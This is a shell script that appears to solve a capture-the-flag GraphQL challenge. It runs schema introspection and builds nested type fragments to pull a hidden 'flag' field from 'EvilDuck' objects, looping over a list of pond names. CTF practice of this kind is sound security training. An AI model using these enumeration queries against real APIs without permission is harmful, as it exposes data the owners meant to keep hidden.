#!/bin/sh

url="https://cparta.djul.datasektionen.se/graphql"

query () {
	jq -n "{query: \"$1\"}"  | tee /dev/stderr
}

ask() {
	curl -v "$url" --json "$(query "$1")" | jq
}

getponds()  {
	curl -v "$url" --json "$(query '{countries { ponds {name} } }')" | jq -r '.data.countries | map(.ponds) | flatten | map(.name) | .[]'
}

# getponds

getquacks() {
	pond="\\\"$1\\\""
	curl -v "$url" --json "$(query "{pond (name:$pond) {ducks {name}}}")" | jq #| jq -r '.data.countries | map(.ponds) | flatten | map(.name) | .[]'
}

quackeries()  {
	curl -v "$url" --json "$(query '{countries { ponds {ducks { family {name} } } } } ')" | jq
}



# getquacks Vilacota
# quackeries
introspect="{__schema { types { name, fields { name type {name kind inputFields {name description } } } } directives { name description } }}"
simplefam="... on Mallard {family {name}}"
flag="... on EvilDuck { flag id } "
mkfam() {
	echo " ... on Mallard { family { $1 } } ... on FancyDuck { family { $1 } }  $flag "
}
fams="$(mkfam "$flag")"
nestfams="$(mkfam "$fams")"
nest3fams="$(mkfam "$nestfams")"
evil="{ countries { ponds { ducks  { $nestfams } }  } }"
fullintro="{\n  __schema {\n    queryType {\n      name\n    }\n    mutationType {\n      name\n    }\n    subscriptionType {\n      name\n    }\n    types {\n      ...FullType\n    }\n    directives {\n      name\n      description\n      args {\n        ...InputValue\n      }\n                \n    }\n  }\n}\n\nfragment FullType on __Type {\n  kind\n  name\n  description\n  fields(includeDeprecated: true) {\n    name\n    description\n    args {\n      ...InputValue\n    }\n    type {\n      ...TypeRef\n    }\n    isDeprecated\n    deprecationReason\n  }\n  inputFields {\n    ...InputValue\n  }\n  interfaces {\n    ...TypeRef\n  }\n  enumValues(includeDeprecated: true) {\n    name\n    description\n    isDeprecated\n    deprecationReason\n  }\n  possibleTypes {\n    ...TypeRef\n  }\n}\n\nfragment InputValue on __InputValue {\n  name\n  description\n  type {\n    ...TypeRef\n  }\n  defaultValue\n}\n\nfragment TypeRef on __Type {\n  kind\n  name\n  ofType {\n    kind\n    name\n    ofType {\n      kind\n      name\n      ofType {\n        kind\n        name\n      }\n    }\n  }\n}"
# ask "$evil" | tee deepevil.txt | jq
# ask "$fullintro"
# ask '{duck(id: [\"18a2d517-bf6b-468d-bee6-001c653f0900\", \"c70a71b3-4ecf-4154-8d29-7a9e22247678\"]) {family{id ... on Mallard {ability} }}}'

fltr() {
    jq '.data.countries | map(.ponds) | flatten | map(.ducks) | flatten | map(.family) | flatten'
}

cat ./ponds.dat | while read pond; do
	qt='\"'
	ask "{pond(name:$qt$pond$qt) {ducks { $nestfams } }}" >> deepevil.txt
done

